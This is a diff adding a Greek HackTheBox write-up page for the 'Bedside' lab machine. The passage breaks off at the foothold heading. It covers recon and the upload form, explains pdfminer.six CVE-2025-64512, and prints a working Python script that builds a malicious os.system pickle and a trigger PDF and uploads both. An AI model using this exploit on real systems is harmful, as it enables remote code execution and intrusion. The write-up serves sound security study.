@@ -1,0 +1,784 @@
+<!DOCTYPE html>
+<html lang="el">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: Bedside — S. Markakis</title>
+<meta name="description" content="Ο υπολογιστής HackTheBox Bedside (μέτριος, Linux) πάρθηκε root από macOS: μια πύλη έρευνας που τρέχει pdfminer.six πέφτει στο CVE-2025-64512 — ένα trigger PDF δείχνει το /Encoding μιας γραμματοσειράς σε ένα ανεβασμένο .pickle.gz και ένας background watcher pdf2txt το κάνει unpickle σε RCE μέσα στο container· ένας εσωτερικός static server στη θύρα 3000 έχει ένα traversal --path-as-is που διαβάζει το κλειδί SSH του χρήστη developer από τον host· και ένας MONAI trainer που τρέχει με sudo καλεί torch.load(weights_only=False) σε ένα checkpoint φυτεμένο από τον επιτιθέμενο μέσω κοινόχρηστου volume /datastore. Το ίδιο bug pickle, δύο φορές, χωρίς reverse shell.">
+<meta property="og:title" content="HTB: Bedside — S. Markakis">
+<meta property="og:description" content="Ο υπολογιστής HackTheBox Bedside (μέτριος, Linux) πάρθηκε root από macOS: μια πύλη έρευνας που τρέχει pdfminer.six πέφτει στο CVE-2025-64512 — ένα trigger PDF δείχνει το /Encoding μιας γραμματοσειράς σε ένα ανεβασμένο .pickle.gz και ένας background watcher pdf2txt το κάνει unpickle σε RCE μέσα στο container· ένας εσωτερικός static server στη θύρα 3000 έχει ένα traversal --path-as-is που διαβάζει το κλειδί SSH του χρήστη developer από τον host· και ένας MONAI trainer που τρέχει με sudo καλεί torch.load(weights_only=False) σε ένα checkpoint φυτεμένο από τον επιτιθέμενο μέσω κοινόχρηστου volume /datastore. Το ίδιο bug pickle, δύο φορές, χωρίς reverse shell.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-bedside-el.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-bedside.png">
+<meta property="og:locale" content="el_GR">
+<meta property="og:locale:alternate" content="en_US">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-bedside.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-bedside-el.html">
+<link rel="alternate" hreflang="en" href="https://s-markakis.github.io/writeups/htb-bedside.html">
+<link rel="alternate" hreflang="el" href="https://s-markakis.github.io/writeups/htb-bedside-el.html">
+<link rel="alternate" hreflang="x-default" href="https://s-markakis.github.io/writeups/htb-bedside.html">
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+  .tag-lin  { background: #d8d0c0; color: #4a3a20; }
+  .tag-win  { background: #c0d0e0; color: #1e3a5a; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.74rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p { color: var(--text); margin-bottom: 1rem; }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  .screenshot {
+    max-width: 100%;
+    height: auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.6rem auto;
+    display: block;
+  }
+  picture { display: block; }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<style>
+  .htb-cta{display:flex;gap:.6rem;flex-wrap:wrap;margin:1.5rem 0}
+  .htb-cta.top{margin-top:.4rem}
+  .htb-cta a{flex:1 1 220px;display:flex;align-items:center;gap:.75rem;padding:.75rem .9rem;background:var(--bg-code);border:1px solid var(--border);border-radius:8px;text-decoration:none;color:var(--text-dark);font-family:'Barlow',sans-serif;transition:transform .15s,border-color .15s,background .15s}
+  .htb-cta a:hover{transform:translateY(-2px);border-color:var(--text-dark);background:var(--bg-term)}
+  .htb-cta svg{width:20px;height:20px;flex:none;stroke:var(--text-dark);fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .htb-cta .l-t{display:block;font-family:'Barlow Condensed',sans-serif;font-weight:600;font-size:1.02rem;letter-spacing:.01em;line-height:1.15;color:var(--text-dark)}
+  .htb-cta .l-s{display:block;font-size:.72rem;color:var(--text-mid);line-height:1.25}
+  .htb-cta .l-x{margin-left:auto;color:var(--text-mid);font-size:.95rem}
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Bedside",
+  "description": "Ο υπολογιστής HackTheBox Bedside (μέτριος, Linux) πάρθηκε root από macOS: μια πύλη έρευνας που τρέχει pdfminer.six πέφτει στο CVE-2025-64512 — ένα trigger PDF δείχνει το /Encoding μιας γραμματοσειράς σε ένα ανεβασμένο .pickle.gz και ένας background watcher pdf2txt το κάνει unpickle σε RCE μέσα στο container· ένας εσωτερικός static server στη θύρα 3000 έχει ένα traversal --path-as-is που διαβάζει το κλειδί SSH του χρήστη developer από τον host· και ένας MONAI trainer που τρέχει με sudo καλεί torch.load(weights_only=False) σε ένα checkpoint φυτεμένο από τον επιτιθέμενο μέσω κοινόχρηστου volume /datastore. Το ίδιο bug pickle, δύο φορές, χωρίς reverse shell.",
+  "datePublished": "2026-08-04",
+  "dateModified": "2026-08-04",
+  "inLanguage": "el",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-bedside-el.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-bedside.png",
+  "keywords": [
+    "offensive",
+    "htb"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-bedside"
+  },
+  "timeRequired": "PT10M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Πίσω στο blog</a>
+
+<div class="wrapper">
+
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">← Πίσω στα posts</a>
+  <p style="font-size:.8rem;letter-spacing:.04em;color:var(--text-mid);margin-bottom:1.2rem;"><a href="htb-bedside.html" style="font-weight:600;">English</a> &nbsp;·&nbsp; <strong style="color:var(--text-dark);">Ελληνικά</strong></p>
+
+  <div class="post-header">
+    <h1>HTB: Bedside</h1>
+    <div class="post-meta">
+      <span class="date">12 Σεπτεμβρίου 2026</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag tag-lin">Linux</span>
+      <span class="tag">Deserialization</span>
+      <span class="tag">pdfminer · CVE-2025-64512</span>
+      <span>&nbsp;13 λεπτά αναγνωσης</span>
+    </div>
+  </div>
+
+  <div class="htb-cta top">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+
+  <hr class="divider">
+
+  <div class="overview">
+    Το Bedside είναι ένα μέτριο box Linux που λέει το ίδιο αστείο δύο φορές: <em>το να εμπιστεύεσαι δεδομένα που δεν πρέπει</em>. Μια "πύλη έρευνας" τρέχει <strong>pdfminer.six</strong>, φρεσκοπληγωμένη από το <strong>CVE-2025-64512</strong> — ένα φτιαγμένο PDF μπορεί να δείξει το <code>/Encoding</code> μιας γραμματοσειράς σε ένα <code>.pickle.gz</code> ελεγχόμενο από τον επιτιθέμενο, και όταν η βιβλιοθήκη φορτώνει εκείνο το CMap κάνει <code>pickle.load()</code> σε αυτό μέχρι εκτέλεση κώδικα. Το να το ανεβάσεις δεν αρκεί· ένας background watcher τροφοδοτεί τον parser μόνο με πραγματικά <code>*.pdf</code>, οπότε το payload είναι <strong>χωρισμένο σε δύο</strong> — το κακόβουλο pickle συν ένα απλό trigger PDF που το αναφέρει. Αυτό προσγειώνει ένα shell μέσα σε container. Από εκεί ένας εσωτερικός image-viewer στη θύρα 3000 αποδεικνύεται ότι είναι ένας static file server με path traversal, που διαβάζει το κλειδί SSH του χρήστη <code>developer</code> κατευθείαν από τον host. Και το πιο περήφανο feature της κλινικής — ένας self-learning MONAI trainer που ο <code>developer</code> μπορεί να τρέξει σαν root — επαναφέρει checkpoints με <code>torch.load(weights_only=False)</code>, που είναι <code>pickle</code> ξανά. Φύτεψε ένα checkpoint, τρέξε τον trainer, πάρε root. Ίδιο bug, δεύτερη δόση. Ολόκληρη η αλυσίδα οδηγείται από macOS — χωρίς reverse shell, μόνο request/response.
+  </div>
+
+  <div class="chain">
+    <span class="chain-node">vhost fuzz → research</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">pdfminer CVE-2025-64512</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">datawrangler (container)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">:3000 path traversal → dev SSH key</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">sudo trainer torch.load</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">root</span>
+  </div>
+
+  <!-- ══ RECON ══ -->
+  <h2>Αναγνώριση</h2>
+
+  <p>Δύο θύρες, και το web root διαρρέει ένα hostname στον τίτλο του — το συνηθισμένο σημάδι να κάνεις fuzz virtual hosts αντί για paths.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nmap</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nmap -Pn -sVC -p22,80 &lt;IP&gt;</span>
+<span class="po">22/tcp open  ssh   OpenSSH 10.0p2 Debian
+80/tcp open  http  Apache httpd 2.4.68 (Debian)   </span><span class="pco"># title: Bedside Clinic - bedside.htb</span></div>
+  </div>
+
+  <p>Και οι δύο εκδόσεις είναι τρέχουσες — κανένα CVE επιπέδου έκδοσης να ρίξω. Αυτό είναι το σημάδι: το bug δεν θα είναι σε αυτό πάνω στο οποίο τρέχει η κλινική, θα είναι σε αυτό που η κλινική <em>έχτισε</em>. Η μπροστινή σελίδα είναι ένα στατικό φυλλάδιο χωρίς τίποτα που να δέχεται input, οπότε έκανα fuzz vhosts, φιλτράροντας το redirect που σερβίρει ο κύριος host για ονόματα που δεν κάνουν resolve:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">ffuf — vhost fuzzing</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">ffuf -u http://bedside.htb -H "Host: FUZZ.bedside.htb" \
+     -w subdomains.txt -fc 301</span>
+<span class="pg">research  [Status: 200, Size: 3152]</span></div>
+  </div>
+
+  <p>Ένα hit: <code>research.bedside.htb</code>. Για να κρατήσω τα πάντα scriptable από macOS δεν άγγιξα ποτέ το <code>/etc/hosts</code> — κάθε request απλά κουβαλά το vhost με το χέρι:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">reach the vhost without /etc/hosts</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">curl -s -i -H "Host: research.bedside.htb" http://&lt;IP&gt;/ | head -6</span>
+<span class="po">HTTP/1.1 200 OK
+Server: Apache/2.4.68 (Debian)
+</span><span class="py">X-Powered-By: pdfminer.six</span><span class="po">
+Content-Type: text/html; charset=UTF-8</span></div>
+  </div>
+
+  <p>Εκείνη η κεφαλίδα <code>X-Powered-By</code> είναι χειροβαλμένη — κανένα framework δεν την γράφει — και ονομάζει ολόκληρο το παιχνίδι: <strong>pdfminer.six</strong>. Η ίδια η πύλη είναι μια φόρμα upload αρχείου ("ανέβασε ακτινογραφίες, CT scans, ερευνητικά έγγραφα για να τροφοδοτήσεις το training μοντέλου AI της κλινικής"), με μια ειδοποίηση που λιστάρει αποδεκτά formats και δύο γραμμές που έχουν περισσότερη σημασία απ' όσο φαίνονται: <em>"Οι συλλογές μπορούν να ανεβούν σαν archives"</em> και <em>"Ορισμένα formats αρχείων μπορεί να μετατραπούν σε τυποποιημένα formats."</em> Ένα upload που δέχεται archives και μετατρέπει αρχεία σιωπηλά είναι ένα upload που κάνει parse πολλά στο παρασκήνιο. Το parsing είναι όπου σπάνε τα πράγματα.</p>
+
+  <!-- ══ PROBING THE UPLOAD ══ -->
+  <h2>Διαβάζοντας τους κανόνες που επέβαλε ο server</h2>
+
+  <p>Πριν αγγίξω το exploit έκανα το upload να μου πει τους δικούς του κανόνες. Το να στείλω ένα αρχείο που απορρίπτει το whitelist διαρρέει δύο χρήσιμα πράγματα — το πραγματικό αποδεκτό σύνολο, και το απόλυτο path αποθήκευσης:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">provoke the errors</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">echo test | curl -s -H "Host: research.bedside.htb" -F "uploadFile=@-;filename=x" http://&lt;IP&gt;/</span>
+<span class="po">Invalid file type. Allowed: jpeg, jpg, png, bmp, tiff, dcm, pdf, </span><span class="py">gz, zip</span><span class="po">
+
+</span><span class="pd">$ </span><span class="pc">printf 'test\n' &gt; x.gz; curl -s -H "Host: research.bedside.htb" -F "uploadFile=@x.gz" http://&lt;IP&gt;/</span>
+<span class="pr">MIME type mismatch. Unable to upload file to destination</span><span class="po"> /var/www/research.bedside.htb/uploads</span></div>
+  </div>
+
+  <p>Δύο γεγονότα προκύπτουν. Πρώτο, το whitelist διαφήμιζε επτά formats στο κοινό αλλά το backend πραγματικά δέχεται και <code>gz</code> και <code>zip</code> — τα undocumented "archives." Δεύτερο, το φίλτρο δεν εμπιστεύεται την επέκταση: ένα <code>.gz</code> που δεν είναι πραγματικό gzip stream απορρίπτεται με βάση το περιεχόμενο, και το παράπονο διαρρέει το <code>/var/www/research.bedside.htb/uploads</code>. Εκείνο το path είναι το κομμάτι που έλειπε για το exploit που επρόκειτο να χτίσω, και μου δόθηκε σε ένα μήνυμα error.</p>
+
+  <p>(Το κόλπο archive-symlink — πακετάρισε ένα symlink στο <code>/etc/passwd</code>, άσε τον server να το κάνει extract, ζήτησέ το πίσω — δεν πάει πουθενά εδώ: ο server αποθηκεύει archives ολόκληρα και ποτέ δεν τα κάνει extract. Άξιζε να δοκιμαστεί, αδιέξοδο.)</p>
+
+  <!-- ══ CVE ══ -->
+  <h2>CVE-2025-64512 — μια γραμματοσειρά που φορτώνει ένα pickle</h2>
+
+  <p>Το pdfminer.six φορτώνει resources CMap (character-map) με όνομα. Εσωτερικά, το <code>CMapDB</code> αντιστοιχίζει ένα όνομα σε ένα αρχείο και κάνει περίπου <code>pickle.loads(gzip.open(name + ".pickle.gz").read())</code>. Η ευπάθεια: το <code>/Encoding</code> μιας γραμματοσειράς Type0 μπορεί να ονομάσει εκείνο το CMap, και το όνομα ελέγχεται από τον επιτιθέμενο — συμπεριλαμβανομένων <strong>απόλυτων paths</strong>. Οπότε ένα PDF που αναφέρει <code>/Encoding /…uploads#2Fsh</code> (όπου το <code>#2F</code> είναι ένα PDF-escaped <code>/</code>) κάνει το pdfminer να φορτώσει και να κάνει unpickle το <code>/var/www/research.bedside.htb/uploads/sh.pickle.gz</code>. Ένα pickle με ένα <code>__reduce__</code> που επιστρέφει <code>(os.system, (cmd,))</code> είναι εκτέλεση κώδικα τη στιγμή που εκείνη η γραμματοσειρά instantiated.</p>
+
+  <p>Κάθε προαπαιτούμενο είναι ήδη στο χέρι: το whitelist μου επιτρέπει να ανεβάσω ένα πραγματικό <code>.gz</code>, και το error MIME μου έδωσε τον ακριβή φάκελο που πρέπει να ονομάσει το PDF. Αλλά η <strong>πρώτη προσπάθειά μου απέτυχε</strong>, και η αποτυχία είναι όλο το μάθημα αυτού του box.</p>
+
+  <h3>Γιατί ένα αρχείο δεν ήταν αρκετό</h3>
+
+  <p>Η προφανής κίνηση είναι το polyglot του luigigubello: ένα μόνο αρχείο που είναι <em>και</em> ένα έγκυρο gzip που κουβαλά το pickle <em>και</em> ένα έγκυρο self-referencing PDF. Το ανέβασα, έστησα έναν listener, και… τίποτα. Το CVE πυροδοτείται μόνο όταν κάτι πραγματικά κάνει <em>parse</em> το PDF, και το να ανεβάσεις απλά ένα αρχείο δεν το τροφοδοτεί στο pdfminer. Κάποιο background job έπρεπε να το πιάσει — και αν εκείνο το job αγγίζει μόνο πραγματικά PDFs, ένα αρχείο με όνομα <code>.pickle.gz</code> κάθεται αγνοημένο για πάντα. Χρειαζόταν να αλλάξω το σχήμα του payload πριν καν δω τον κώδικα που τελικά θα το επιβεβαίωνε.</p>
+
+  <p>Οπότε χώρισα το payload σε δύο. Το κακόβουλο pickle κρατά το όνομα <code>.pickle.gz</code> του ώστε το pdfminer να το φορτώσει σαν CMap. Ένα ξεχωριστό, κοινότυπα-φαινόμενο <code>trigger.pdf</code> δείχνει το <code>/Encoding</code> του σε εκείνο το pickle. Το background job σαρώνει για πραγματικά PDFs, βρίσκει το <code>trigger.pdf</code>, το κάνει parse, ακολουθεί την αναφορά CMap στο pickle μου, και εκρήγνυται. Ορίστε ο builder — το <code>__reduce__</code> είναι το payload, το PDF είναι μια ελάχιστη γραμματοσειρά Type0 της οποίας το encoding είναι το απόλυτο path του pickle με τις κάθετες escaped:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">build_and_send.py — the two-file payload</span>
+    </div>
+    <div class="term-body"><span class="pco">#!/usr/bin/env python3</span>
+<span class="pb">import</span><span class="po"> gzip, pickle, os, sys, subprocess</span>
+
+<span class="po">IP, HOST = "&lt;IP&gt;", "research.bedside.htb"
+UP   = "/var/www/research.bedside.htb/uploads"
+NAME = "sh"                       </span><span class="pco"># pickle stored as &lt;NAME&gt;.pickle.gz</span><span class="po">
+CMD  = sys.argv[1]</span>
+
+<span class="pb">class</span><span class="pc"> RCE</span><span class="po">:
+    </span><span class="pb">def</span><span class="pc"> __reduce__</span><span class="po">(self):
+        </span><span class="pb">return</span><span class="po"> (os.system, (CMD,))</span>
+
+<span class="pco"># 1) malicious pickle, gzip-compressed -&gt; passes the "is it a real gzip" check</span>
+<span class="po">open("sh.pickle.gz","wb").write(gzip.compress(pickle.dumps(RCE())))</span>
+
+<span class="pco"># 2) trigger.pdf: a Type0 font whose /Encoding names the pickle (/ -&gt; #2F)</span>
+<span class="po">enc = (UP + "/" + NAME).replace("/", "#2F")
+PDF = ("%PDF-1.4\n"
+  "1 0 obj&lt;&lt; /Type /Catalog /Pages 2 0 R &gt;&gt;endobj\n"
+  "2 0 obj&lt;&lt; /Type /Pages /Kids [3 0 R] /Count 1 &gt;&gt;endobj\n"
+  "3 0 obj&lt;&lt; /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
+  "/Contents 4 0 R /Resources &lt;&lt; /Font &lt;&lt; /F1 5 0 R &gt;&gt; &gt;&gt; &gt;&gt;endobj\n"
+  "4 0 obj&lt;&lt; /Length 20 &gt;&gt;stream\nBT /F1 12 Tf ET\nendstream endobj\n"
+  "5 0 obj&lt;&lt; /Type /Font /Subtype /Type0 /BaseFont /F /Encoding /__ENC__ "
+  "/DescendantFonts [6 0 R] &gt;&gt;endobj\n"
+  "6 0 obj&lt;&lt; /Type /Font /Subtype /CIDFontType2 /BaseFont /F /FontDescriptor 7 0 R &gt;&gt;endobj\n"
+  "7 0 obj&lt;&lt; /Type /FontDescriptor /FontName /F /Flags 4 &gt;&gt;endobj\n"
+  "trailer&lt;&lt; /Size 8 /Root 1 0 R &gt;&gt;\n%%EOF\n").replace("__ENC__", enc)
+open("trigger.pdf","wb").write(PDF.encode())</span>
+
+<span class="pco"># upload both (retry until the portal returns "successfully")</span>
+<span class="pb">def</span><span class="pc"> up</span><span class="po">(path, ctype):
+    for _ in range(6):
+        r = subprocess.run(["curl","-s","-H",f"Host: {HOST}",
+            "-F",f"uploadFile=@{path};type={ctype}", f"http://{IP}/"],
+            capture_output=True, text=True)
+        if "successfully" in r.stdout: return
+up("sh.pickle.gz","application/gzip")
+up("trigger.pdf","application/pdf")</span></div>
+  </div>
+
+  <!-- ══ FOOTHOLD ══ -->
